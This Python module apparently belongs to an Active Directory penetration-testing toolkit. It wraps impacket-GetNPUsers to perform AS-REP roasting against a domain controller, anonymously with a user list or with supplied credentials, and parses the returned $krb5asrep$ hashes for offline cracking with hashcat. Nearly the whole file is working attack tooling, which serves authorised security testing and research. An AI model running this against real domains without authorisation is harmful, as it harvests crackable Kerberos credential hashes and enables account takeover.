"""
GetNPUsers AS-REP Roasting Enumerator.

Tests users for AS-REP roastability using impacket-GetNPUsers.
Retrieves TGT hashes for cracking when pre-authentication is disabled.
"""

import re
import subprocess
import time
import tempfile
from pathlib import Path
from typing import Optional, List, Dict, Any


def strip_ansi(text: str) -> str:
    """Remove ANSI escape sequences from text."""
    ansi_pattern = r'\x1b\[[0-9;]*[a-zA-Z]'
    return re.sub(ansi_pattern, '', text)

from .base import (
    Enumerator,
    EnumerationResult,
    AuthLevel,
)


class GetNPUsersEnumerator(Enumerator):
    """
    AS-REP Roasting enumerator via impacket-GetNPUsers.

    Tests users for "Do not require Kerberos preauthentication" flag.
    When found, retrieves the AS-REP hash for offline cracking.

    Modes:
    - Anonymous + user_list: Tests each user for AS-REP (no creds needed)
    - Authenticated: Queries LDAP for all users, then tests each
    """

    @property
    def id(self) -> str:
        return "getnpusers"

    @property
    def name(self) -> str:
        return "GetNPUsers AS-REP"

    @property
    def required_tool(self) -> str:
        return "impacket-GetNPUsers"

    @property
    def supports_anonymous(self) -> bool:
        return True  # Works without creds if user_list provided

    def get_command(self, target, username=None, password=None, domain=None, user_list=None, **kwargs):
        """Return the command that would be run and explanation."""
        if username and password:
            cmd = ["impacket-GetNPUsers", f"{domain}/{username}:***", "-dc-ip", target]
            desc = "AS-REP roasting with authenticated LDAP user discovery"
        else:
            cmd = ["impacket-GetNPUsers", f"{domain}/", "-dc-ip", target, "-no-pass", "-usersfile", "<users.txt>"]
            user_count = len(user_list) if user_list else 0
            desc = f"AS-REP roasting test for {user_count} discovered users"

        return (cmd, desc)

    def run(
        self,
        target: str,
        username: Optional[str] = None,
        password: Optional[str] = None,
        timeout: int = 120,
        domain: Optional[str] = None,
        user_list: Optional[List[str]] = None,
    ) -> EnumerationResult:
        start = time.time()

        result = EnumerationResult(
            enumerator_id=self.id,
            success=False,
            auth_level=AuthLevel.AUTHENTICATED if username else AuthLevel.ANONYMOUS,
            dc_ip=target,
        )

        if not domain:
            result.error = "Domain required for GetNPUsers (provide --domain)"
            result.duration_seconds = time.time() - start
            return result

        result.domain = domain

        # Build command
        # Format: impacket-GetNPUsers domain/ -dc-ip target [auth options]
        cmd = ["impacket-GetNPUsers", f"{domain}/", "-dc-ip", target]

        user_file = None

        if username and password:
            # Authenticated mode - can query LDAP for all users
            cmd.extend(["-usersfile", "-"])  # Read from LDAP
            # Actually, with creds we use -u user -p pass
            # GetNPUsers with creds queries all users automatically
            cmd = ["impacket-GetNPUsers", f"{domain}/{username}:{password}", "-dc-ip", target]
        else:
            # Anonymous mode - need user list
            if not user_list:
                result.error = "User list required for anonymous AS-REP testing"
                result.duration_seconds = time.time() - start
                return result

            # Write user list to temp file
            with tempfile.NamedTemporaryFile(
                mode="w", suffix=".txt", delete=False
            ) as f:
                f.write("\n".join(user_list))
                user_file = f.name

            cmd.extend(["-no-pass", "-usersfile", user_file])

        try:
            proc = subprocess.run(
                cmd, capture_output=True, text=True, timeout=timeout
            )
            output = proc.stdout + proc.stderr
            output = strip_ansi(output)  # Remove ANSI escape codes
            result.raw_output = output

            # Parse results
            result.users = self._parse_output(output, domain)
            result.success = True
            result.duration_seconds = time.time() - start

        except subprocess.TimeoutExpired:
            result.error = f"Timeout after {timeout}s"
            result.duration_seconds = time.time() - start
        except Exception as e:
            result.error = str(e)
            result.duration_seconds = time.time() - start
        finally:
            # Cleanup temp file
            if user_file:
                Path(user_file).unlink(missing_ok=True)

        return result

    def _parse_output(self, output: str, domain: str) -> List[Dict[str, Any]]:
        """
        Parse GetNPUsers output for AS-REP hashes.

        Example output:
        $krb5asrep$23$svc-alfresco@HTB.LOCAL:abc123...
        [-] User administrator doesn't have UF_DONT_REQUIRE_PREAUTH set
        """
        users = []
        seen = set()

        # AS-REP hash pattern (hashcat mode 18200)
        # Format: $krb5asrep$23$username@DOMAIN:salt$hash
        hash_pattern = r"(\$krb5asrep\$23\$([^@]+)@[^:]+:[^\s]+)"
        for match in re.finditer(hash_pattern, output):
            full_hash = match.group(1)
            username = match.group(2)

            if username.lower() not in seen:
                seen.add(username.lower())
                users.append(
                    {
                        "name": username,
                        "upn": f"{username}@{domain}",
                        "enabled": True,
                        "asrep": True,
                        "asrep_hash": full_hash,
                        "validated": True,
                    }
                )

        # Also parse users that DON'T have AS-REP (for completeness)
        no_asrep_pattern = r"User (\S+) doesn't have UF_DONT_REQUIRE_PREAUTH"
        for match in re.finditer(no_asrep_pattern, output, re.I):
            username = match.group(1)
            if username.lower() not in seen:
                seen.add(username.lower())
                users.append(
                    {
                        "name": username,
                        "upn": f"{username}@{domain}",
                        "enabled": True,
                        "asrep": False,
                        "validated": True,
                    }
                )

        return users
